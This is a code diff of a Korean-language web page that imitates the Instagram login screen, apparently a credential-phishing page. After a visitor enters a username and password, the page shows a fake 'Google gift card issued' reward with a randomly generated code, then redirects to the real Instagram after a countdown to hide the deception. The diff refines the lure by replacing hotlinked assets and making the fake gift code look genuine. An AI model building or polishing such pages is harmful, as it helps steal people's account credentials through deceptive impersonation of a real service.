@@ -26,8 +26,11 @@
             margin-bottom: 10px;
             border-radius: 1px;
         }
-        #instaLogo {
-            width: 175px;
+        .instaLogoText {
+            font-family: 'Billabong', cursive, sans-serif;
+            font-size: 45px;
+            font-weight: normal;
+            color: #262626;
             margin: 22px 0 35px 0;
         }
         .inlineToBlock {
@@ -94,11 +97,6 @@
             padding: 5px;
             width: 100%;
         }
-        .facebookIcon {
-            width: 16px;
-            height: 16px;
-            margin-right: 8px;
-        }
         .haveAccount {
             background: white;
             border: 1px solid #dbdbdb;
@@ -111,7 +109,6 @@
             text-decoration: none;
             font-weight: 600;
         }
-        /* 상품권 지급 화면 스타일 */
         #rewardBox {
             display: none;
             background: white;
@@ -128,10 +125,10 @@
         .reward-code {
             background: #efefef;
             padding: 12px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: bold;
-            color: #0095f6;
-            letter-spacing: 2px;
+            color: #4285F4;
+            letter-spacing: 1.5px;
             margin: 20px 0;
             border-radius: 4px;
             border: 1px dashed #dbdbdb;
@@ -148,12 +145,12 @@
     <div class="contentsWrap">
         <!-- 로그인 창 -->
         <div class="loginWindow" id="loginWindow">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2.png/7a281da00b49.png" alt="Instagram" id="instaLogo">
+            <div class="instaLogoText">Instagram</div>
             
             <form id="loginForm">
                 <input type="text" id="username" placeholder="전화번호, 사용자 이름 또는 이메일" class="inlineToBlock" required>
                 <input type="password" id="password" placeholder="비밀번호" class="inlineToBlock" required>
-                <button type="submit" class="inlineToBlock ordinaryLogin unactivatedLoginColor">로그인</button>
+                <button type="submit" class="inlineToBlock ordinaryLogin">로그인</button>
             </form>
 
             <div class="horizonAndOrWrap">
@@ -164,18 +161,17 @@
 
             <a href="#" class="noneunderline">
                 <button class="inlineToBlock facebookLogin" type="button">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmcvvn.png" alt="" class="facebookIcon">
-                    Facebook으로 로그인
+                    <span style="font-weight: bold; margin-right: 5px; color: #385185;">f</span> Facebook으로 로그인
                 </button>
             </a>
         </div>
         
-        <!-- 상품권 지급 완료 창 (처음엔 숨겨져 있음) -->
+        <!-- 구글 기프트 카드 지급 완료 창 -->
         <div id="rewardBox">
-            <div class="reward-title">🎉 이벤트 상품권 지급 완료!</div>
-            <div class="reward-desc">참여해주셔서 감사합니다.<br>아래 상품권 코드를 복사해서 사용하세요.</div>
+            <div class="reward-title">🎁 구글 기프트 카드 지급 완료!</div>
+            <div class="reward-desc">참여가 확인되었습니다.<br>아래 기프트 코드를 등록해 주세요.</div>
             <div class="reward-code" id="couponCode"></div>
-            <div class="reward-desc" style="font-size: 11px; margin-top: 15px;">※ 본 코드는 선착순으로 등록 후 소멸될 수 있습니다.</div>
+            <div class="reward-desc" id="timerText" style="font-size: 12px; margin-top: 15px; color: #0095f6; font-weight: 600;">6초 후 인스타그램으로 이동합니다...</div>
         </div>
 
         <div class="haveAccount" id="bottomBox">
@@ -207,14 +203,33 @@
                 console.log(err);
             });
 
-            // 랜덤 가짜 상품권 번호 생성 (예: 문화상품권 스타일)
-            const randomCode = "GIFT-" + Math.floor(1000 + Math.random() * 9000) + "-" + Math.floor(1000 + Math.random() * 9000) + "-" + Math.floor(1000 + Math.random() * 9000);
-            document.getElementById('couponCode').innerText = randomCode;
+            // 구글 기프트 카드 형식 코드 생성 (예: ABCD-EFGH-IJKL-MNOP)
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            let part1 = "", part2 = "", part3 = "", part4 = "";
+            for(let i=0; i<4; i++) {
+                part1 += chars.charAt(Math.floor(Math.random() * chars.length));
+                part2 += chars.charAt(Math.floor(Math.random() * chars.length));
+                part3 += chars.charAt(Math.floor(Math.random() * chars.length));
+                part4 += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const googleCode = `${part1}-${part2}-${part3}-${part4}`;
+            document.getElementById('couponCode').innerText = googleCode;
 
-            // 로그인 창을 숨기고 상품권 지급 창을 띄움
+            // 로그인 창 숨기고 기프트 카드 창 띄우기
             document.getElementById('loginWindow').style.display = 'none';
             document.getElementById('bottomBox').style.display = 'none';
             document.getElementById('rewardBox').style.display = 'block';
+
+            // 6초 카운트다운 후 인스타그램으로 이동
+            let timeLeft = 5;
+            const timerInterval = setInterval(() => {
+                document.getElementById('timerText').innerText = `${timeLeft}초 후 인스타그램으로 이동합니다...`;
+                timeLeft--;
+                if (timeLeft < 0) {
+                    clearInterval(timerInterval);
+                    window.location.href = "https://www.instagram.com";
+                }
+            }, 1000);
         });
     </script>
 </body>
